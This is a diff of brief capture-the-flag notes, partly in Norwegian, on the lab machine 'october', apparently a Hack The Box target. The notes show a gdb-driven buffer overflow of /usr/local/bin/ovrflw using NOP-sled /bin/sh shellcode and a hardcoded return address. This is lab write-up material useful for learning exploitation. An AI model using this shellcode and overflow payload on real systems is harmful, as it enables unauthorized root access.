@@ -1,6 +1,6 @@
 ## october 10.10.10.16
 
-linux
+Linux october 4.4.0-78-generic \#99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 i686 i686 GNU/Linux
 
 22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 \(Ubuntu Linux; protocol 2.0\)
 
@@ -28,21 +28,15 @@ Exploiting /usr/local/bin/ovrflw but NX bit is on and ASLR is enabled on the mac
 
 /usr/local/bin/ovrflw
 
-
-
 disassemble main
 
 break \*0x080484c5
 
-run $\(python -c "print\('A'\*256\)"\)
+run $\(python -c "print\('A'\*32\)"\)
 
 x/200xb $esp
 
-
-
-0xbfcfc180 eller 0xbfcfc178
-
-
+0xbfcfc180 eller **0x bf cf c1 78**
 
 quit
 
@@ -50,11 +44,13 @@ run $\(python -c "print\('A'\*200\)"\)
 
 run $\(python -c "print\('A'\*112\)"\)
 
-**run $\(python -c "print\('A'\*112+'BBBB'\)"\)**
+116 = 41 har 112 bytes med minne
 
-41 blir til 42
+med **run $\(python -c "print\('A'\*112+'BBBB'\)"\)**  blir til 42
 
-112 - 23 byte shellcode = 87
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 
-run $\(python -c "print\('\x90'\*87+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'+'\x87\xcf\x1c\xfc\fb'\)"\)
+112 - 28 byte shellcode = 84
+
+run $\(python -c "print\('\x90'\*84+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+'\x78\xc1\xcf\xbf'\)"\)
 
